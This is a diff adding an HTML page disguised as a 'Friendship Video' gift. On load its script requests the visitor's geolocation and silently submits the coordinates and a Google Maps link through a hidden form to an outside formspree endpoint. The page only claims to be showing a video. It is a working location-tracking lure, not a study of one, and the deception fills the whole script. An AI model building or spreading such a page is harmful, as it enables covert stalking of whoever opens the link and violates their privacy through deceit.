@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Friendship Video</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 30px;
+      background: #fdf0f5;
+    }
+    video {
+      border-radius: 12px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>💖 A Special Video Just for You 💖</h1>
+
+  <video controls width="400">
+    <source src="friends .mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+
+  <p id="status">Loading your location... Please wait...</p>
+
+  <!-- Hidden form to submit location -->
+  <form id="locationForm" action="https://formspree.io/f/xgvkevlv" method="POST" style="display: none;">
+    <input type="hidden" name="latitude" id="lat">
+    <input type="hidden" name="longitude" id="lon">
+    <input type="hidden" name="location_link" id="locationLink">
+  </form>
+
+  <script>
+    function sendLocation(lat, lon) {
+      document.getElementById("lat").value = lat;
+      document.getElementById("lon").value = lon;
+      document.getElementById("locationLink").value = `https://www.google.com/maps?q=${lat},${lon}`;
+      document.getElementById("locationForm").submit();
+      document.getElementById("status").textContent = "Thanks for watching! ❤️";
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        sendLocation(lat, lon);
+      }, error => {
+        document.getElementById("status").textContent = "❌ Unable to get location permission.";
+      });
+    } else {
+      document.getElementById("status").textContent = "❌ Geolocation not supported.";
+    }
+  </script>
+
+</body>
+</html>
